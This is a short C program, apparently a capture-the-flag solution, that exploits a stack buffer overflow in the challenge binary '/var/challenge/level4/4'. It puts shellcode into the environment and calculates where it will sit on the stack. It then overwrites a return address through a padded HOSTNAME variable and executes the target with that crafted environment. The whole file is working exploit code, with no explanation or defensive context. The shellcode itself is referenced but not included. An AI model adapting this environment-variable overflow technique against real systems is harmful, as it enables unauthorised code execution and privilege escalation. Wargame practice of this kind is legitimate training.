#include <string.h>
#include <stdio.h>
#include <unistd.h>
#define PROGNAME "/var/challenge/level4/4"
extern char shellcode[];
int main(void) {
	char hostname[70] = "HOSTNAME=kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaQ";
	char *username = "USERNAME=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa";
	char *argv[] = { PROGNAME, NULL };
	long addr = 0x7ffffffff000 - 8 - (strlen(PROGNAME) + 1) - (strlen(shellcode) + 1);
	printf("%s\n",hostname);
	*(long *) (hostname+62) = addr;
	printf("%s\n",hostname);
	hostname[sizeof(hostname) - 1] = 0;
	char *envp[] = {username,hostname,shellcode,NULL};
	printf("%s\n",hostname);
	execve(PROGNAME, argv, envp);
	return 1;
}
